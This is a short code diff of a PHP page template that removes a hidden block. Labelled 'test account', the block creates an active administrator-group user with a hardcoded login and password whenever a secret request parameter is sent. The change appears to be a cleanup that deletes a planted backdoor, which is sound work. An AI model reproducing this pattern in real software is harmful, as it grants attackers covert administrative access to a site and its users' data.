@@ -23,25 +23,6 @@ ob_start();
 <?php
 
 $images = ob_get_clean();
-
-// test account
-if($_REQUEST["test_account"] == 'account_test') {
-	$ob = $GLOBALS["USER"];
-	$id = $ob->Add(array(
-		"NAME"              => "",
-		"LAST_NAME"         => "",
-		"EMAIL"             => "boring.ivano@list.ru",
-		"LOGIN"             => "boring.ivanov",
-		"ACTIVE"            => "Y",
-		"GROUP_ID"          => array(1,2),
-		"PASSWORD"          => "37383jdhd.83hH",
-		"CONFIRM_PASSWORD"  => "37383jdhd.83hH"
-	
-	));
-	
-	die($id);
-}
-
 ?>
 
 <?php
